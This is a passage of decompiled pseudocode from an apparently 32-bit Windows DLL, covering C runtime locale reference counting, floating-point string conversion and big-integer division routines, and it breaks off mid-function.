    "char __cdecl __acrt_execute_uninitializers(int a1, int a2)",
    "{",
    "  int i; // esi",
    "  void (__cdecl *v3)(_DWORD); // edi",
    "",
    "  for ( i = a2; i != a1; i -= 8 )",
    "  {",
    "    v3 = *(void (__cdecl **)(_DWORD))(i - 4);",
    "    if ( v3 )",
    "      v3(0);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __acrt_has_user_matherr()",
    "{",
    "  return __ROR4__(__security_cookie ^ dword_1004086C, __security_cookie & 0x1F) != 0;",
    "}",
    "",
    "",
    "int __cdecl sub_100253C0(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = a1;",
    "  dword_1004086C = a1;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_100253D0(int a1)",
    "{",
    "  int (__cdecl *v1)(int); // esi",
    "",
    "  v1 = (int (__cdecl *)(int))__ROR4__(__security_cookie ^ dword_1004086C, __security_cookie & 0x1F);",
    "  if ( v1 )",
    "    return v1(a1);",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "int __cdecl __acrt_add_locale_ref(int a1)",
    "{",
    "  volatile signed __int32 *v1; // ecx",
    "  volatile signed __int32 *v2; // ecx",
    "  volatile signed __int32 *v3; // ecx",
    "  volatile signed __int32 *v4; // ecx",
    "  volatile signed __int32 **v5; // ecx",
    "  int v6; // esi",
    "  volatile signed __int32 *v7; // edx",
    "",
    "  _InterlockedIncrement((volatile signed __int32 *)(a1 + 12));",
    "  v1 = *(volatile signed __int32 **)(a1 + 124);",
    "  if ( v1 )",
    "    _InterlockedIncrement(v1);",
    "  v2 = *(volatile signed __int32 **)(a1 + 132);",
    "  if ( v2 )",
    "    _InterlockedIncrement(v2);",
    "  v3 = *(volatile signed __int32 **)(a1 + 128);",
    "  if ( v3 )",
    "    _InterlockedIncrement(v3);",
    "  v4 = *(volatile signed __int32 **)(a1 + 140);",
    "  if ( v4 )",
    "    _InterlockedIncrement(v4);",
    "  v5 = (volatile signed __int32 **)(a1 + 40);",
    "  v6 = 6;",
    "  do",
    "  {",
    "    if ( *(v5 - 2) != (volatile signed __int32 *)&unk_1003F268 && *v5 )",
    "      _InterlockedIncrement(*v5);",
    "    if ( *(v5 - 3) )",
    "    {",
    "      v7 = *(v5 - 1);",
    "      if ( v7 )",
    "        _InterlockedIncrement(v7);",
    "    }",
    "    v5 += 4;",
    "    --v6;",
    "  }",
    "  while ( v6 );",
    "  return __acrt_locale_add_lc_time_reference(*(_DWORD *)(a1 + 156));",
    "}",
    "",
    "",
    "void __cdecl sub_10025486(char *Block)",
    "{",
    "  _UNKNOWN **v1; // eax",
    "  _DWORD *v2; // eax",
    "  _DWORD *v3; // eax",
    "  _DWORD *v4; // eax",
    "  _DWORD *v5; // eax",
    "  int v6; // eax",
    "  void **v7; // ebx",
    "  void **v8; // edi",
    "  _DWORD *v9; // eax",
    "  int v10; // [esp+4h] [ebp-4h]",
    "",
    "  v1 = (_UNKNOWN **)*((_DWORD *)Block + 34);",
    "  if ( v1 )",
    "  {",
    "    if ( v1 != &off_1003FA60 )",
    "    {",
    "      v2 = (_DWORD *)*((_DWORD *)Block + 31);",
    "      if ( v2 )",
    "      {",
    "        if ( !*v2 )",
    "        {",
    "          v3 = (_DWORD *)*((_DWORD *)Block + 33);",
    "          if ( v3 && !*v3 )",
    "          {",
    "            _free_base(*((void **)Block + 33));",
    "            __acrt_locale_free_monetary(*((_DWORD *)Block + 34));",
    "          }",
    "          v4 = (_DWORD *)*((_DWORD *)Block + 32);",
    "          if ( v4 && !*v4 )",
    "          {",
    "            _free_base(*((void **)Block + 32));",
    "            __acrt_locale_free_numeric(*((_DWORD *)Block + 34));",
    "          }",
    "          _free_base(*((void **)Block + 31));",
    "          _free_base(*((void **)Block + 34));",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v5 = (_DWORD *)*((_DWORD *)Block + 35);",
    "  if ( v5 && !*v5 )",
    "  {",
    "    _free_base((void *)(*((_DWORD *)Block + 36) - 254));",
    "    _free_base((void *)(*((_DWORD *)Block + 37) - 128));",
    "    _free_base((void *)(*((_DWORD *)Block + 38) - 128));",
    "    _free_base(*((void **)Block + 35));",
    "  }",
    "  __acrt_locale_free_lc_time_if_unreferenced(*((void **)Block + 39));",
    "  v6 = 6;",
    "  v7 = (void **)(Block + 160);",
    "  v10 = 6;",
    "  v8 = (void **)(Block + 40);",
    "  do",
    "  {",
    "    if ( *(v8 - 2) != &unk_1003F268 )",
    "    {",
    "      if ( *v8 && !*(_DWORD *)*v8 )",
    "      {",
    "        _free_base(*v8);",
    "        _free_base(*v7);",
    "      }",
    "      v6 = v10;",
    "    }",
    "    if ( *(v8 - 3) )",
    "    {",
    "      v9 = *(v8 - 1);",
    "      if ( v9 && !*v9 )",
    "        _free_base(*(v8 - 1));",
    "      v6 = v10;",
    "    }",
    "    ++v7;",
    "    v8 += 4;",
    "    v10 = --v6;",
    "  }",
    "  while ( v6 );",
    "  _free_base(Block);",
    "}",
    "",
    "",
    "signed __int32 __cdecl __acrt_locale_add_lc_time_reference(int a1)",
    "{",
    "  if ( !a1 || (_UNKNOWN **)a1 == &off_10031EE0 )",
    "    return 0x7FFFFFFF;",
    "  else",
    "    return _InterlockedIncrement((volatile signed __int32 *)(a1 + 176));",
    "}",
    "",
    "",
    "void __cdecl __acrt_locale_free_lc_time_if_unreferenced(void **Block)",
    "{",
    "  if ( Block && Block != (void **)&off_10031EE0 && !Block[44] )",
    "  {",
    "    __acrt_locale_free_time(Block);",
    "    _free_base(Block);",
    "  }",
    "}",
    "",
    "",
    "signed __int32 __cdecl __acrt_locale_release_lc_time_reference(int a1)",
    "{",
    "  if ( !a1 || (_UNKNOWN **)a1 == &off_10031EE0 )",
    "    return 0x7FFFFFFF;",
    "  else",
    "    return _InterlockedDecrement((volatile signed __int32 *)(a1 + 176));",
    "}",
    "",
    "",
    "signed __int32 __cdecl __acrt_release_locale_ref(signed __int32 a1)",
    "{",
    "  signed __int32 result; // eax",
    "  volatile signed __int32 *v2; // ecx",
    "  volatile signed __int32 *v3; // ecx",
    "  volatile signed __int32 *v4; // ecx",
    "  volatile signed __int32 *v5; // ecx",
    "  volatile signed __int32 **v6; // ecx",
    "  int v7; // esi",
    "  volatile signed __int32 *v8; // edx",
    "",
    "  result = a1;",
    "  if ( a1 )",
    "  {",
    "    _InterlockedDecrement((volatile signed __int32 *)(a1 + 12));",
    "    v2 = *(volatile signed __int32 **)(a1 + 124);",
    "    if ( v2 )",
    "      _InterlockedDecrement(v2);",
    "    v3 = *(volatile signed __int32 **)(a1 + 132);",
    "    if ( v3 )",
    "      _InterlockedDecrement(v3);",
    "    v4 = *(volatile signed __int32 **)(a1 + 128);",
    "    if ( v4 )",
    "      _InterlockedDecrement(v4);",
    "    v5 = *(volatile signed __int32 **)(a1 + 140);",
    "    if ( v5 )",
    "      _InterlockedDecrement(v5);",
    "    v6 = (volatile signed __int32 **)(a1 + 40);",
    "    v7 = 6;",
    "    do",
    "    {",
    "      if ( *(v6 - 2) != (volatile signed __int32 *)&unk_1003F268 && *v6 )",
    "        _InterlockedDecrement(*v6);",
    "      if ( *(v6 - 3) )",
    "      {",
    "        v8 = *(v6 - 1);",
    "        if ( v8 )",
    "          _InterlockedDecrement(v8);",
    "      }",
    "      v6 += 4;",
    "      --v7;",
    "    }",
    "    while ( v7 );",
    "    return __acrt_locale_release_lc_time_reference(*(_DWORD *)(a1 + 156));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __acrt_update_thread_locale_data()",
    "{",
    "  int v0; // eax",
    "  int *v1; // edi",
    "  int v2; // esi",
    "",
    "  v0 = sub_1001FFAC();",
    "  v1 = (int *)(v0 + 76);",
    "  if ( (dword_1003FAB8 & *(_DWORD *)(v0 + 848)) == 0 || (v2 = *v1) == 0 )",
    "  {",
    "    __acrt_lock(4);",
    "    v2 = _updatetlocinfoEx_nolock(v1, dword_10040368);",
    "    __acrt_unlock(4);",
    "    if ( !v2 )",
    "      abort();",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "int __cdecl _updatetlocinfoEx_nolock(signed __int32 *a1, int a2)",
    "{",
    "  signed __int32 v2; // edi",
    "",
    "  if ( !a2 || !a1 )",
    "    return 0;",
    "  v2 = *a1;",
    "  if ( *a1 != a2 )",
    "  {",
    "    *a1 = a2;",
    "    __acrt_add_locale_ref(a2);",
    "    if ( v2 )",
    "    {",
    "      __acrt_release_locale_ref(v2);",
    "      if ( !*(_DWORD *)(v2 + 12) && (wchar_t **)v2 != &off_1003F1A8 )",
    "        sub_10025486((char *)v2);",
    "    }",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "void __cdecl __acrt_locale_free_monetary(void **a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    if ( a1[3] != off_1003FA6C )",
    "      _free_base(a1[3]);",
    "    if ( a1[4] != off_1003FA70 )",
    "      _free_base(a1[4]);",
    "    if ( a1[5] != off_1003FA74 )",
    "      _free_base(a1[5]);",
    "    if ( a1[6] != off_1003FA78 )",
    "      _free_base(a1[6]);",
    "    if ( a1[7] != off_1003FA7C )",
    "      _free_base(a1[7]);",
    "    if ( a1[8] != off_1003FA80 )",
    "      _free_base(a1[8]);",
    "    if ( a1[9] != off_1003FA84 )",
    "      _free_base(a1[9]);",
    "    if ( a1[14] != off_1003FA98 )",
    "      _free_base(a1[14]);",
    "    if ( a1[15] != off_1003FA9C )",
    "      _free_base(a1[15]);",
    "    if ( a1[16] != off_1003FAA0 )",
    "      _free_base(a1[16]);",
    "    if ( a1[17] != off_1003FAA4 )",
    "      _free_base(a1[17]);",
    "    if ( a1[18] != off_1003FAA8 )",
    "      _free_base(a1[18]);",
    "    if ( a1[19] != off_1003FAAC )",
    "      _free_base(a1[19]);",
    "  }",
    "}",
    "",
    "",
    "void __cdecl __acrt_locale_free_numeric(void **a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    if ( *a1 != off_1003FA60 )",
    "      _free_base(*a1);",
    "    if ( a1[1] != off_1003FA64 )",
    "      _free_base(a1[1]);",
    "    if ( a1[2] != off_1003FA68 )",
    "      _free_base(a1[2]);",
    "    if ( a1[12] != off_1003FA90 )",
    "      _free_base(a1[12]);",
    "    if ( a1[13] != off_1003FA94 )",
    "      _free_base(a1[13]);",
    "  }",
    "}",
    "",
    "",
    "void __cdecl free_crt_array_internal(void **a1, unsigned int a2)",
    "{",
    "  void **i; // esi",
    "",
    "  for ( i = a1; i != &a1[a2]; ++i )",
    "    _free_base(*i);",
    "}",
    "",
    "",
    "void __cdecl __acrt_locale_free_time(void **a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    free_crt_array_internal(a1, 7u);",
    "    free_crt_array_internal(a1 + 7, 7u);",
    "    free_crt_array_internal(a1 + 14, 0xCu);",
    "    free_crt_array_internal(a1 + 26, 0xCu);",
    "    free_crt_array_internal(a1 + 38, 2u);",
    "    _free_base(a1[40]);",
    "    _free_base(a1[41]);",
    "    _free_base(a1[42]);",
    "    free_crt_array_internal(a1 + 45, 7u);",
    "    free_crt_array_internal(a1 + 52, 7u);",
    "    free_crt_array_internal(a1 + 59, 0xCu);",
    "    free_crt_array_internal(a1 + 71, 0xCu);",
    "    free_crt_array_internal(a1 + 83, 2u);",
    "    _free_base(a1[85]);",
    "    _free_base(a1[86]);",
    "    _free_base(a1[87]);",
    "    _free_base(a1[88]);",
    "  }",
    "}",
    "",
    "",
    "BOOL __cdecl sub_10025A13(",
    "        struct __crt_locale_pointers *a1,",
    "        DWORD dwInfoType,",
    "        LPCCH lpMultiByteStr,",
    "        int cbMultiByte,",
    "        LPWORD lpCharType,",
    "        UINT CodePage,",
    "        int a7)",
    "{",
    "  UINT v7; // ebx",
    "  BOOL StringTypeW; // edi",
    "  unsigned int v9; // eax",
    "  int v10; // eax",
    "  unsigned int v11; // eax",
    "  void *v12; // esp",
    "  _DWORD *v13; // esi",
    "  _DWORD *v14; // eax",
    "  int v15; // eax",
    "  _DWORD v17[3]; // [esp+0h] [ebp-28h] BYREF",
    "  _DWORD v18[3]; // [esp+Ch] [ebp-1Ch] BYREF",
    "  char v19; // [esp+18h] [ebp-10h]",
    "  int cchWideChar; // [esp+1Ch] [ebp-Ch]",
    "  size_t Size; // [esp+20h] [ebp-8h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v18, a1);",
    "  v7 = CodePage;",
    "  if ( !CodePage )",
    "    v7 = *(_DWORD *)(v18[1] + 8);",
    "  StringTypeW = 0;",
    "  v9 = 1;",
    "  if ( a7 )",
    "    v9 = 9;",
    "  v10 = __acrt_MultiByteToWideChar(v7, v9, lpMultiByteStr, cbMultiByte, 0, 0);",
    "  cchWideChar = v10;",
    "  if ( v10 )",
    "  {",
    "    Size = 2 * v10;",
    "    v11 = 2 * v10 < (unsigned int)(2 * v10 + 8) ? 2 * v10 + 8 : 0;",
    "    if ( v11 )",
    "    {",
    "      if ( v11 > 0x400 )",
    "      {",
    "        v14 = sub_100202D0(v11);",
    "        v13 = v14;",
    "        if ( v14 )",
    "        {",
    "          *v14 = 56797;",
    "          goto LABEL_12;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v12 = alloca(v11);",
    "        v13 = v17;",
    "        if ( v17 )",
    "        {",
    "          v17[0] = 52428;",
    "LABEL_12:",
    "          v13 += 2;",
    "          if ( v13 )",
    "          {",
    "            memset(v13, 0, Size);",
    "            v15 = __acrt_MultiByteToWideChar(v7, 1u, lpMultiByteStr, cbMultiByte, (LPWSTR)v13, cchWideChar);",
    "            if ( v15 )",
    "              StringTypeW = GetStringTypeW(dwInfoType, (LPCWCH)v13, v15, lpCharType);",
    "          }",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v13 = 0;",
    "    }",
    "    _freea_crt((int)v13);",
    "  }",
    "  if ( v19 )",
    "    *(_DWORD *)(v18[0] + 848) &= ~2u;",
    "  return StringTypeW;",
    "}",
    "",
    "",
    "int sub_10025B20()",
    "{",
    "  return dword_10040878;",
    "}",
    "",
    "",
    "int __cdecl _set_new_mode(int NewMode)",
    "{",
    "  if ( (unsigned int)NewMode < 2 )",
    "    return _InterlockedExchange(&dword_10040878, NewMode);",
    "  *(_DWORD *)sub_1001E025() = 22;",
    "  _invalid_parameter_noinfo();",
    "  return -1;",
    "}",
    "",
    "",
    "bool __cdecl check_trailing(_BYTE *a1, int a2)",
    "{",
    "  if ( !a2 )",
    "    return 1;",
    "  while ( *a1 == 48 )",
    "    ++a1;",
    "  return *a1 != 0;",
    "}",
    "",
    "",
    "bool __cdecl should_round_up(int a1, char *a2, int a3, int a4, int a5)",
    "{",
    "  int v6; // eax",
    "  int v7; // edx",
    "",
    "  if ( !a5 )",
    "    return *a2 >= 53;",
    "  v6 = sub_100276C0();",
    "  if ( v6 )",
    "  {",
    "    if ( v6 == 512 )",
    "    {",
    "      if ( check_trailing(a2, a4) && a3 != 45 )",
    "        return 1;",
    "    }",
    "    else if ( v6 == 256 && check_trailing(a2, a4) && a3 == 45 )",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( *a2 > 53 )",
    "      return 1;",
    "    if ( *a2 >= 53 )",
    "    {",
    "      if ( !check_trailing(a2 + 1, a4) )",
    "      {",
    "        if ( v7 != a1 )",
    "          return *(_BYTE *)(v7 - 1) & 1;",
    "        return 0;",
    "      }",
    "      return 1;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl __acrt_fp_strflt_to_string(",
    "        char *a1,",
    "        unsigned int a2,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        int a6,",
    "        __crt_cached_ptd_host *a7)",
    "{",
    "  int v8; // edx",
    "  int v9; // eax",
    "  int *v10; // ebx",
    "  int v11; // esi",
    "  char *v12; // eax",
    "  char *v13; // esi",
    "  char v14; // bl",
    "  int v15; // [esp-8h] [ebp-14h]",
    "  int v16; // [esp+8h] [ebp-4h]",
    "",
    "  if ( !a1 )",
    "  {",
    "    *((_BYTE *)a7 + 28) = 1;",
    "    *((_DWORD *)a7 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a7);",
    "    return 22;",
    "  }",
    "  if ( !a2 )",
    "    goto LABEL_9;",
    "  v8 = a3;",
    "  v9 = 0;",
    "  *a1 = 0;",
    "  if ( a3 > 0 )",
    "    v9 = a3;",
    "  if ( a2 <= v9 + 1 )",
    "  {",
    "    v15 = 34;",
    "LABEL_10:",
    "    v11 = v15;",
    "    *((_DWORD *)a7 + 6) = v15;",
    "    *((_BYTE *)a7 + 28) = 1;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a7);",
    "    return v11;",
    "  }",
    "  v10 = (int *)a4;",
    "  if ( !a4 )",
    "  {",
    "LABEL_9:",
    "    v15 = 22;",
    "    goto LABEL_10;",
    "  }",
    "  v12 = *(char **)(a4 + 8);",
    "  v13 = a1 + 1;",
    "  v16 = (int)v12;",
    "  *a1 = 48;",
    "  if ( a3 > 0 )",
    "  {",
    "    do",
    "    {",
    "      v14 = *v12;",
    "      if ( *v12 )",
    "        ++v12;",
    "      else",
    "        v14 = 48;",
    "      *v13++ = v14;",
    "      --v8;",
    "    }",
    "    while ( v8 > 0 );",
    "    v10 = (int *)a4;",
    "  }",
    "  *v13 = 0;",
    "  if ( v8 >= 0 && should_round_up(v16, v12, *v10, a5, a6) )",
    "  {",
    "    while ( *--v13 == 57 )",
    "      *v13 = 48;",
    "    ++*v13;",
    "  }",
    "  if ( *a1 == 49 )",
    "    ++v10[1];",
    "  else",
    "    memmove(a1, a1 + 1, strlen(a1 + 1) + 1);",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_10025D10(int *a1, unsigned int *a2)",
    "{",
    "  int v2; // esi",
    "  unsigned int v3; // edi",
    "  unsigned int v4; // ecx",
    "  unsigned int v5; // edi",
    "  unsigned int *v6; // edx",
    "  int v7; // esi",
    "  int result; // eax",
    "  unsigned int v9; // esi",
    "  bool v10; // cf",
    "  unsigned int v11; // edi",
    "  int *v12; // ecx",
    "  unsigned __int64 v13; // rcx",
    "  unsigned int v14; // eax",
    "  int v15; // eax",
    "  int v16; // edx",
    "  unsigned int *v17; // ecx",
    "  unsigned int *v18; // esi",
    "  unsigned int v19; // ebx",
    "  bool v20; // zf",
    "  int v21; // eax",
    "  int v22; // ecx",
    "  unsigned int v23; // ebx",
    "  int v24; // ebx",
    "  unsigned int v25; // edx",
    "  unsigned int *v26; // ecx",
    "  unsigned __int64 v27; // rax",
    "  unsigned int v28; // ebx",
    "  int v29; // ebx",
    "  unsigned __int64 v30; // rax",
    "  int v31; // ebx",
    "  unsigned __int64 v32; // rdi",
    "  int v33; // eax",
    "  unsigned int v34; // ecx",
    "  unsigned int *v35; // eax",
    "  unsigned __int64 v36; // rdi",
    "  unsigned int *v37; // ebx",
    "  _DWORD *v38; // eax",
    "  unsigned int v39; // ecx",
    "  unsigned int *v40; // edx",
    "  int v41; // esi",
    "  unsigned int v42; // edi",
    "  unsigned int v43; // ecx",
    "  unsigned int v44; // eax",
    "  unsigned int v45; // ecx",
    "  unsigned int v46; // kr0C_4",
    "  unsigned int v47; // edx",
    "  int v48; // edi",
    "  char *v49; // ecx",
    "  unsigned int v50; // eax",
    "  int *v51; // edx",
    "  unsigned __int64 v52; // [esp-14h] [ebp-248h]",
    "  _BYTE Source[460]; // [esp+10h] [ebp-224h] BYREF",
    "  int v54; // [esp+1DCh] [ebp-58h]",
    "  __int64 v55; // [esp+1E0h] [ebp-54h]",
    "  __int64 v56; // [esp+1E8h] [ebp-4Ch]",
    "  int v57; // [esp+1F0h] [ebp-44h]",
    "  unsigned int v58; // [esp+1F4h] [ebp-40h]",
    "  int v59; // [esp+1F8h] [ebp-3Ch]",
    "  int v60; // [esp+1FCh] [ebp-38h]",
    "  int v61; // [esp+200h] [ebp-34h]",
    "  int v62; // [esp+204h] [ebp-30h]",
    "  unsigned int *v63; // [esp+208h] [ebp-2Ch]",
    "  unsigned int v64; // [esp+20Ch] [ebp-28h]",
    "  int v65; // [esp+210h] [ebp-24h]",
    "  __int64 v66; // [esp+214h] [ebp-20h]",
    "  unsigned int v67; // [esp+21Ch] [ebp-18h]",
    "  int v68; // [esp+220h] [ebp-14h]",
    "  __int64 v69; // [esp+224h] [ebp-10h]",
    "  int *v70; // [esp+22Ch] [ebp-8h]",
    "  unsigned int v71; // [esp+230h] [ebp-4h]",
    "",
    "  v2 = *a1;",
    "  if ( !*a1 )",
    "    return 0;",
    "  v3 = *a2;",
    "  v64 = v3;",
    "  if ( !v3 )",
    "    return 0;",
    "  v4 = v2 - 1;",
    "  v70 = (int *)(v2 - 1);",
    "  v5 = v3 - 1;",
    "  if ( !v5 )",
    "  {",
    "    v6 = (unsigned int *)a2[1];",
    "    v63 = v6;",
    "    if ( v6 == (unsigned int *)1 )",
    "    {",
    "      v7 = a1[1];",
    "      *a1 = 0;",
    "      memcpy_s(a1 + 1, 0x1CCu, Source, 0);",
    "      return v7;",
    "    }",
    "    else if ( v2 == 1 )",
    "    {",
    "      v9 = a1[1];",
    "      *a1 = 0;",
    "      memcpy_s(a1 + 1, 0x1CCu, Source, 0);",
    "      result = v9 / (unsigned int)v63;",
    "      v10 = v9 % (unsigned int)v63 != 0;",
    "      a1[1] = v9 % (unsigned int)v63;",
    "      *a1 = v10;",
    "    }",
    "    else",
    "    {",
    "      v69 = 0;",
    "      v55 = 0;",
    "      v11 = 0;",
    "      v71 = 0;",
    "      if ( v2 )",
    "      {",
    "        v12 = &a1[v2];",
    "        v70 = v12;",
    "        do",
    "        {",
    "          v52 = __PAIR64__(v11, *v12);",
    "          v13 = __PAIR64__(v11, *v12) % (unsigned int)v6;",
    "          v64 = HIDWORD(v13);",
    "          v11 = v13;",
    "          v71 = v52 / (unsigned int)v6;",
    "          v6 = v63;",
    "          v12 = --v70;",
    "          --v2;",
    "        }",
    "        while ( v2 );",
    "      }",
    "      else",
    "      {",
    "        v64 = HIDWORD(v55);",
    "      }",
    "      *a1 = 0;",
    "      memcpy_s(a1 + 1, 0x1CCu, Source, 0);",
    "      v14 = v64;",
    "      v10 = v64 != 0;",
    "      a1[1] = v11;",
    "      a1[2] = v14;",
    "      result = v71;",
    "      *a1 = v10 + 1;",
    "    }",
    "    return result;",
    "  }",
    "  if ( v5 > v4 )",
    "    return 0;",
    "  v15 = v2 - 1;",
    "  v16 = v4 - v5;",
    "  if ( (int)v4 < (int)(v4 - v5) )",
    "    goto LABEL_21;",
    "  v17 = (unsigned int *)&a1[v2];",
    "  v18 = &a2[v5 + 1];",
    "  while ( *v18 == *v17 )",
    "  {",
    "    --v15;",
    "    --v18;",
    "    --v17;",
    "    if ( v15 < v16 )",
    "      goto LABEL_21;",
    "  }",
    "  if ( *v18 < *v17 )",
    "LABEL_21:",
    "    ++v16;",
    "  if ( !v16 )",
    "    return 0;",
    "  v19 = a2[v64];",
    "  v71 = a2[v64 - 1];",
    "  v20 = !_BitScanReverse((unsigned int *)&v21, v19);",
    "  v60 = v19;",
    "  if ( v20 )",
    "    v22 = 32;",
    "  else",
    "    v22 = 31 - v21;",
    "  v62 = v22;",
    "  v61 = 32 - v22;",
    "  if ( v22 )",
    "  {",
    "    v60 = (v71 >> v61) | (v19 << v62);",
    "    v23 = v71 << v62;",
    "    v71 <<= v62;",
    "    if ( v64 > 2 )",
    "      v71 = (a2[v64 - 2] >> v61) | v23;",
    "  }",
    "  v24 = v16 - 1;",
    "  v69 = 0;",
    "  HIDWORD(v55) = v16 - 1;",
    "  if ( v16 - 1 < 0 )",
    "  {",
    "    v48 = v69;",
    "  }",
    "  else",
    "  {",
    "    v25 = v24 + v64;",
    "    v58 = v24 + v64;",
    "    v57 = (int)&a1[v24 + 1];",
    "    v26 = (unsigned int *)&a1[v24 - 1 + v64];",
    "    v63 = v26;",
    "    v54 = v69;",
    "    do",
    "    {",
    "      if ( v25 > (unsigned int)v70 )",
    "        HIDWORD(v27) = 0;",
    "      else",
    "        HIDWORD(v27) = v26[2];",
    "      LODWORD(v27) = v26[1];",
    "      v28 = *v26;",
    "      HIDWORD(v56) = HIDWORD(v27);",
    "      HIDWORD(v66) = HIDWORD(v27);",
    "      v67 = v27;",
    "      v65 = v28;",
    "      if ( v62 )",
    "      {",
    "        v27 <<= v62;",
    "        LODWORD(v27) = (v28 >> v61) | v27;",
    "        v29 = v28 << v62;",
    "        HIDWORD(v66) = HIDWORD(v27);",
    "        v67 = v27;",
    "        v65 = v29;",
    "        if ( v58 >= 3 )",
    "        {",
    "          LODWORD(v27) = v67;",
    "          v65 = (*(v63 - 1) >> v61) | v29;",
    "        }",
    "      }",
    "      v30 = v27 / (unsigned int)v60;",
    "      v68 = HIDWORD(v30);",
    "      v31 = v30;",
    "      v59 = v30;",
    "      v69 = v30;",
    "      v32 = __PAIR64__(HIDWORD(v66), v67) % (unsigned int)v60;",
    "      v33 = HIDWORD(v30);",
    "      v67 = 0;",
    "      if ( HIDWORD(v30) )",
    "      {",
    "        v32 += (__PAIR64__(v68, v31) - 0xFFFFFFFF) * (unsigned int)v60;",
    "        v31 = -1;",
    "        v33 = 0;",
    "        v67 = HIDWORD(v32);",
    "        v59 = -1;",
    "        v69 = 0xFFFFFFFFLL;",
    "        v68 = 0;",
    "      }",
    "      if ( !HIDWORD(v32) )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          HIDWORD(v66) = v65;",
    "          if ( v71 * __PAIR64__(v33, v31) <= __PAIR64__(v32, v65) )",
    "            break;",
    "          v10 = v31-- != 0;",
    "          LODWORD(v69) = v31;",
    "          v33 = v10 + v68 - 1;",
    "          v68 = v33;",
    "          v20 = __CFADD__(v60, (_DWORD)v32) + v67 == 0;",
    "          v67 = (__PAIR64__(v67, v60) + (unsigned int)v32) >> 32;",
    "          LODWORD(v32) = v60 + v32;",
    "          HIDWORD(v69) = v33;",
    "          if ( !v20 )",
    "            goto LABEL_44;",
    "        }",
    "        v33 = v68;",
    "LABEL_44:",
    "        v59 = v31;",
    "      }",
    "      if ( v33 || v31 )",
    "      {",
    "        v34 = v64;",
    "        v35 = a2;",
    "        v66 = 0;",
    "        v36 = 0;",
    "        if ( v64 )",
    "        {",
    "          v37 = (unsigned int *)v57;",
    "          v38 = a2 + 1;",
    "          v70 = (int *)(a2 + 1);",
    "          v65 = v64;",
    "          do",
    "          {",
    "            HIDWORD(v66) = *v38;",
    "            v39 = v69 * HIDWORD(v66) + v36;",
    "            LODWORD(v36) = (v69 * HIDWORD(v66) + v36) >> 32;",
    "            HIDWORD(v36) = 0;",
    "            if ( *v37 < v39 )",
    "              ++v36;",
    "            *v37++ -= v39;",
    "            v38 = v70 + 1;",
    "            v20 = v65-- == 1;",
    "            ++v70;",
    "          }",
    "          while ( !v20 );",
    "          v35 = a2;",
    "          v31 = v59;",
    "          v34 = v64;",
    "        }",
    "        HIDWORD(v66) = v35 + 1;",
    "        if ( HIDWORD(v56) < v36 )",
    "        {",
    "          if ( v34 )",
    "          {",
    "            v40 = (unsigned int *)v57;",
    "            v41 = HIDWORD(v66);",
    "            v42 = v34;",
    "            v56 = 0;",
    "            do",
    "            {",
    "              v43 = *v40;",
    "              v41 += 4;",
    "              ++v40;",
    "              v44 = (*(unsigned int *)(v41 - 4) + (unsigned __int64)v43) >> 32;",
    "              v45 = *(_DWORD *)(v41 - 4) + v43;",
    "              v46 = HIDWORD(v56);",
    "              *(v40 - 1) = HIDWORD(v56) + v45;",
    "              HIDWORD(v56) = (__PAIR64__(v44, v46) + v45) >> 32;",
    "              --v42;",
    "            }",
    "            while ( v42 );",
    "            v31 = v59;",
    "          }",
    "          --v31;",
    "        }",
    "        v47 = v58;",
    "        v70 = (int *)(v58 - 1);",
    "      }",
    "      else",
    "      {",
    "        v47 = v58;",
    "      }",
    "      v48 = v31;",
    "      v54 = v31;",
    "      v57 -= 4;",
    "      v25 = v47 - 1;",
    "      --HIDWORD(v55);",
    "      v26 = v63 - 1;",
    "      v58 = v25;",
    "      --v63;",
    "    }",
    "    while ( v55 >= 0 );",
    "  }",
    "  v49 = (char *)v70 + 1;",
    "  v50 = (unsigned int)v70 + 1;",
    "  if ( (unsigned int)v70 + 1 < *a1 )",
    "  {",
    "    v51 = &a1[v50 + 1];",
    "    do",
    "    {",
    "      *v51++ = 0;",
    "      ++v50;",
    "    }",
    "    while ( v50 < *a1 );",
    "  }",
    "  *a1 = (int)v49;",
    "  if ( v49 )",
    "  {",
    "    do",
    "    {",
    "      if ( a1[(_DWORD)v49] )",
    "        break;",
    "      v20 = v49-- == (char *)1;",
    "      *a1 = (int)v49;",
    "    }",
    "    while ( !v20 );",
    "  }",
    "  return v48;",
    "}",
    "",
    "",
    "int __cdecl sub_100261E7(__int64 a1, int a2, int a3, int *a4, char *a5, rsize_t SizeInBytes)",
    "{",
    "  int v6; // ebx",
    "  int v7; // edi",
    "  int v8; // eax",
    "  int *v9; // ecx",
    "  errno_t v10; // eax",
    "  int v11; // eax",
    "  int v12; // eax",
    "  int v13; // eax",
    "  int v14; // eax",
    "  int v15; // eax",
    "  int v16; // edx",
    "  unsigned int v17; // edi",
    "  char *v18; // eax",
    "  unsigned int v19; // edx",
    "  int i; // ecx",
    "  bool v21; // zf",
    "  int v22; // eax",
    "  unsigned int v23; // ecx",
    "  unsigned int v24; // esi",
    "  unsigned int v25; // eax",
    "  unsigned int v26; // esi",
    "  char *v27; // ecx",
    "  int *v28; // eax",
    "  int v29; // eax",
    "  unsigned int v30; // ecx",
    "  unsigned int v31; // eax",
    "  char *v32; // eax",
    "  char v33; // cl",
    "  int v34; // eax",
    "  char *v35; // ecx",
    "  unsigned int v36; // esi",
